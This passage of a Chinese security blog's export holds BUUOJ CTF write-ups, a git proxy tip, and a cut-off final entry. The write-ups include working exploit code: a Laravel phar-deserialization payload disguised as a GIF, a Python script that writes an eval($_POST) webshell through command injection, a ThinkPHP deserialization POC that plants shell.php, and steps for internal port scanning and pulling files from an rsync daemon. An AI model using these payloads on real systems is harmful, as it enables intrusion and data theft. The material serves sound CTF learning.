class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path, $writable = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = $writable ? <span class="string">'w+b'</span> : <span class="string">'rb'</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'get_magic_quotes_runtime'</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $filePath = <span class="string">"/var/www/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php"</span>;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($filePath, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的文件上传后，点击check抓包,添加path参数<code>phar:///var/www/html/storage/app/public/1.gif</code></p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231622734.png" alt></p><p>提交以后模板文件就会被删除，我们访问/flag就会出现刷新以后的页面，即flag了</p><p>另外我在先知上看到有一个pop链可以rce，<a href="https://xz.aliyun.com/t/2901，有时间补一下，先占个坑" target="_blank" rel="noopener">https://xz.aliyun.com/t/2901，有时间补一下，先占个坑</a></p><p>参考资料：</p><blockquote><p><a href="https://www.cnblogs.com/peri0d/p/12512343.html" target="_blank" rel="noopener">https://www.cnblogs.com/peri0d/p/12512343.html</a></p><p><a href="https://tiaonmmn.github.io/2019/09/04/BUUOJ刷题-Web-easy-laravel/#more" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-laravel/#more</a></p><p><a href="https://www.anquanke.com/post/id/161849#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/161849#h3-4</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
            <tag> Laravel反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由一道入群题学习内网渗透基础</title>
      <link href="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h3 id="题目名称：ctf473831530-2018-web-virink-web"><a href="#题目名称：ctf473831530-2018-web-virink-web" class="headerlink" title="题目名称：ctf473831530_2018_web_virink_web"></a>题目名称：ctf473831530_2018_web_virink_web</h3><ol><li>页面打开是源代码</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&#39;orange&#39; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 20) &#123;</span><br><span class="line">        exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br &#x2F;&gt; IP : &#123;\$_SERVER[&#39;REMOTE_ADDR&#39;]&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>利用<code>1=&gt;filename</code>的特性创建特殊的文件，然后<code>ls -tr</code>列文件拼出完整的shell。exp如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">base_url &#x3D; &#39;http:&#x2F;&#x2F;d9cdeeab-00ae-45c0-bc56-45fb800d996a.node3.buuoj.cn&#39;</span><br><span class="line"></span><br><span class="line">def exec_cmd2(c):</span><br><span class="line">    # exec cmd</span><br><span class="line">    my_params &#x3D; &#123;</span><br><span class="line">        &#39;cmd&#39;: c</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.get(base_url, params&#x3D;my_params)</span><br><span class="line">    print(&#39;exec cmd2&#39;, c, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_webshell():</span><br><span class="line">    filename &#x3D; [r&#39;&gt;echo\ \\&#39;, r&quot;&gt;\&#39;\&lt;\?php \\&quot;, r&#39;&gt;eval\(&#39;, r&#39;&gt;\$_POST\[c\]\)&#39;, r&quot;&gt;\;\&#39;\&gt;2.php&quot;]</span><br><span class="line">    for i in filename:</span><br><span class="line">        my_params &#x3D; &#123;</span><br><span class="line">            &#39;cmd&#39;: i</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.get(base_url, params&#x3D;my_params)</span><br><span class="line">        print(i, r.status_code)</span><br><span class="line"></span><br><span class="line">    cmd_list &#x3D; [&#39;ls -tr&gt;1.sh&#39;, &#39;sh 1.sh&#39;]</span><br><span class="line">    for i in cmd_list:</span><br><span class="line">        exec_cmd2(i)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    write_webshell()</span><br><span class="line">    print(&#39;ok&#39;)</span><br></pre></td></tr></table></figure><ol start="3"><li>就可以成功写入一句话木马，通过小马利用蚁剑传一个大马上去(ps:这里使用的是kali自带的weevely3)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass &#x2F;home&#x2F;hw&#x2F;桌面&#x2F;1.php</span><br></pre></td></tr></table></figure><ol start="4"><li>结合提示python3以及flag不在此serve，可以想到需要内网渗透，但是tmd ifconfig等查ip的命令都被禁用了，这里可用cat /etc/hosts或者 cat /proc/net/fib_trie查看，另外包含phpinfo页面也可成功拿到本机ip</li></ol><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215224239332.png" alt></p><ol start="5"><li>使用weevely3连接大马，进行下一步操作</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;d9cdeeab-00ae-45c0-bc56-45fb800d996a.node3.buuoj.cn&#x2F;sandbox&#x2F;0098771fc87704c388bc566c6cd8104b&#x2F;1.php pass</span><br></pre></td></tr></table></figure><p>上传一个ip&amp;port扫描的脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import telnetlib</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip):</span><br><span class="line">    server &#x3D; telnetlib.Telnet()</span><br><span class="line">    for port in [21, 22, 23, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 873, 1433, 3306, 3389, 5432, 6082, 6379, 7001, 7002, 8000, 9000,9090, 8080, 8081, 8089, 9090, 27017, 27018]:</span><br><span class="line">        try:</span><br><span class="line">            server.open(ip, port)</span><br><span class="line">            print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">        except Exception as err:</span><br><span class="line">            #print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip, port))</span><br><span class="line">            pass</span><br><span class="line">        finally:</span><br><span class="line">            server.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_open(q):</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            ip &#x3D; q.get_nowait()</span><br><span class="line">            get_ip_status(ip)</span><br><span class="line">    except queue.Empty as e:</span><br><span class="line">        pass</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; []</span><br><span class="line">    ip &#x3D; sys.argv[1:]</span><br><span class="line">    ip &#x3D; &quot;&quot;.join(ip)</span><br><span class="line">    args &#x3D; &quot;.&quot;.join(ip.split(&quot;.&quot;)[:-1])</span><br><span class="line">    for i in range(1, 256):</span><br><span class="line">        host.append(&quot;&#123;off1&#125;.&#123;off2&#125;&quot;.format(off1&#x3D;args, off2&#x3D;i))</span><br><span class="line">    q &#x3D; queue.Queue()</span><br><span class="line">    for ip in host:</span><br><span class="line">        q.put(ip)</span><br><span class="line">    threads &#x3D; []</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t &#x3D; threading.Thread(target&#x3D;check_open, args&#x3D;(q,))</span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line"> </span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>简易版本端口扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    with open(&#39;active_port.txt&#39;,&#39;at&#39;) as f:</span><br><span class="line">        for i in range(65535+1):</span><br><span class="line">            ip &#x3D; &#39;172.64.152.4&#39;</span><br><span class="line">            try:</span><br><span class="line">                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+&#39;\n&#39;)</span><br><span class="line">            except socket.error:</span><br><span class="line">                pass</span><br><span class="line">        f.close()</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    foo()</span><br><span class="line">    print(&#39;ok&#39;)</span><br></pre></td></tr></table></figure><p>可以在结果发现，172.16.233.111开放了80，873，9000端口，继续写脚本探测80端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import urllib.request</span><br><span class="line">import time</span><br><span class="line">HEADERS &#x3D; &#123;&#39;user-agent&#39;: (&#39;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5)&#39;</span><br><span class="line">                          &#39;AppleWebKit&#x2F;537.36 (KHTML, like Gecko)&#39;</span><br><span class="line">                          &#39;Chrome&#x2F;45.0.2454.101 Safari&#x2F;537.36&#39;),</span><br><span class="line">           &#39;referer&#39;: &#39;http:&#x2F;&#x2F;172.16.233.111&#x2F;index.html&#39;,</span><br><span class="line">           &#39;X-Forwared-For&#39;: &#39;127.0.0.1&#39;</span><br><span class="line">           &#125;</span><br><span class="line">file &#x3D; urllib.request.Request(&quot;http:&#x2F;&#x2F;172.16.233.111:80&#x2F;&quot;, headers&#x3D;HEADERS)</span><br><span class="line"> </span><br><span class="line">data &#x3D; urllib.request.urlopen(file)</span><br><span class="line"> </span><br><span class="line">print(data.headers)</span><br><span class="line">print(data.read().decode(&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215231542666.png" alt></p><p>老高做的时候用net_curl命令进行探测</p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200319134817242.png" alt></p><p>873对应Rsync，9000对应FPM。我们先试试9000的FPM漏洞。</p><p>利用在Phithon牛一篇文章（<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html）中的脚本（https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75）读取一下目录" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html）中的脚本（https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75）读取一下目录</a></p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215233458653.png" alt></p><p>发现存在flag，但是没有权限读取。利用rsync可以读取flag</p><p>简单来说rsync是可以实现增量备份的工具，默认端口为873</p><blockquote><p>rsync可以实现scp的远程拷贝(rsync不支持远程到远程的拷贝，但scp支持)、cp的本地拷贝、rm删除和”ls -l”显示文件列表等功能</p></blockquote><p>这里要关注的是rsync daemon模式</p><blockquote><p>rsync daemon是向外提供服务的，这样只要告诉了别人rsync的url路径，外人就能向ftp服务器一样获取文件列表并进行选择性地下载</p></blockquote><p>所以我们可以利用这一点获取rsync允许访问目录下的文件。</p><blockquote><p>rsync daemon是”rsync  –daemon”或再加上其他一些选项启动的，它会读取配置文件，默认是/etc/rsyncd.conf，并默认监听在873端口上，当外界有客户端对此端口发起连接请求，通过这个网络套接字就可以完成连接，以后与该客户端通信的所有数据都通过该网络套接字传输。</p></blockquote><p>根据这篇文章介绍的<a href="https://www.cnblogs.com/f-ck-need-u/p/7220009.html#auto_id_0" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7220009.html#auto_id_0</a></p><p>首先查看<code>/etc/rsyncd.conf</code></p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215233930976.png" alt></p><p>定义了模块<code>src</code>，路径中包含flag，<br> 那么可以使用命令<code>rsync 127.0.0.1::src/7h1s_i5_f14g /tmp/</code>将flag备份出来</p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215234020817.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/12239018.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12239018.html</a></p><p><a href="https://www.youncyb.cn/?p=435" target="_blank" rel="noopener">https://www.youncyb.cn/?p=435</a></p><p>weevely用法：<a href="https://www.cnblogs.com/yufusec/p/9245618.html" target="_blank" rel="noopener">https://www.cnblogs.com/yufusec/p/9245618.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透方向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git配置代理</title>
      <link href="/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
      <url>/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于本地git clone下载速度慢，配置一下git代理后，速度下载快了很多。</p><h3 id="步骤过程"><a href="#步骤过程" class="headerlink" title="步骤过程"></a>步骤过程</h3><ol><li>本地代理工具的端口是10808，在 <code>Git</code> 命令行输入以下配置全局代理：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//127.0.0.1指的是本地，10808指的是代理工具设置的端口</span><br><span class="line">git config --global http.proxy socks5://127.0.0.1:10808</span><br></pre></td></tr></table></figure><ol start="2"><li>使用以下命令查看是否配置好</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global -e</span><br></pre></td></tr></table></figure><p>打开后有如图所示，即配置成功。</p><p><img src="/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200319101136987.png" alt></p><ol start="3"><li>取消代理使用命令</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> git代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-web刷题（二）</title>
      <link href="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-强网杯-2019-Upload"><a href="#0x-01-强网杯-2019-Upload" class="headerlink" title="0x 01 强网杯 2019]Upload"></a>0x 01 强网杯 2019]Upload</h3><ul><li><p>考点</p><p>代码审计，PHP 反序列化</p></li><li><p>解题过程</p></li></ul><ol><li>目录扫描发现 /<a href="http://www.tar.gz敏感文件，下载下来进行审计，存在" target="_blank" rel="noopener">www.tar.gz敏感文件，下载下来进行审计，存在</a> .idea 目录，拖入Phpstrom查看，发现存在两处断点,猜测是出题人的提示</li></ol><p>application/web/controller/Index.php：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319110910722.png" alt></p><p>application/web/controller/Register.php：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319111027954.png" alt></p><ol start="2"><li>审计代码发现：①Register.php注册，有<strong>destruct()函数，想判断注没注册，没注册的给调用 check 也就是 Index 的 index 方法②Index.php，最主要的就是login_check函数，并且发现其他函数执行前一般都会调用这个，应该是检查有没有登陆，最关键的是把cookie(‘user’)反序列化了，所以payload应该放在cookie(‘user’)里。③Profile.php，对文件进行操作，有__</strong>get,__call方法<br><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112709035.png" alt></li></ol><p>在upload_img方法中</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112809487.png" alt></p><p>先login_check检查登陆，然后判断上传的文件是否为空，不为空则将文件信息赋值给<br> $this-&gt;filename_tmp，将文件名md5加密并拼接png赋值给$this-&gt;filename，进入ext_check判断后缀是否为png，将结果给$this-&gt;ext</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112855911.png" alt></p><ol start="3"><li>利用思路：我们先上传一个图片马，然后将filename_tmp=图片马路径，filename=xxx.php，经过复制便可达到getshell，所以要想办法在不上传文件的情况下调用upload_img</li></ol><p>回到入口函数：<br> Register::__destruct()进入if，调用$this-&gt;checker的index()，将$this-&gt;checker=new Profile()，会调用Profile::_call:</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113057678.png" alt></p><p>那么此时$this-&gt;name=index，$args为空，进入if的代码就变成了：<code>$this-&gt;index();</code></p><p>调用了该类中不存在的成员变量，触发_get魔术方法</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113233704.png" alt></p><p>_get会返回$this-&gt;except[‘index’]，也就是$this-&gt;except<a href>‘index’</a>，只要将except[‘index’]=upload_img就能调用了</p><ol start="4"><li>先利用蚁剑生成webshell，然后使用十六进制工具复制进正常图片的结尾处</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113647891.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113557518.png" alt></p><p>注册账号上传图片，得到图片路径</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319114124209.png" alt></p><p>生成poc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Register&#123;</span><br><span class="line">public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#x2F;&#x2F;确保进入if</span><br><span class="line">    $this-&gt;registed &#x3D; 0;</span><br><span class="line">        $this-&gt;checker &#x3D; new Profile();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Profile&#123;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $except;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    $this-&gt;except&#x3D;[&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;];</span><br><span class="line">    $this-&gt;filename_tmp &#x3D;&quot;.&#x2F;upload&#x2F;76d9f00467e5ee6abc3ca60892ef304e&#x2F;4a47a0db6e60853dedfcfdf08a5ca249.png&quot;;</span><br><span class="line">    $this-&gt;filename &#x3D; &quot;.&#x2F;upload&#x2F;shell.php&quot;;</span><br><span class="line">    $this-&gt;ext&#x3D;&quot;png&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new Register()));</span><br></pre></td></tr></table></figure><p>将cookie替换成生成的结果，刷新页面，访问shell.php</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319114414679.png" alt></p><p>连接蚁剑，得到flag</p><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104374416" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104374416</a></p><p><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p></blockquote><h3 id="0x-02-CISCN2019-华东南赛区-Web11"><a href="#0x-02-CISCN2019-华东南赛区-Web11" class="headerlink" title="0x 02 [CISCN2019 华东南赛区]Web11"></a>0x 02 [CISCN2019 华东南赛区]Web11</h3><ul><li><p>考点</p><p>Smarty SSTI</p></li><li><p>解题过程</p></li></ul><ol><li><p>题目提醒<code>Build With Smarty</code>，猜测应该是<code>smarty 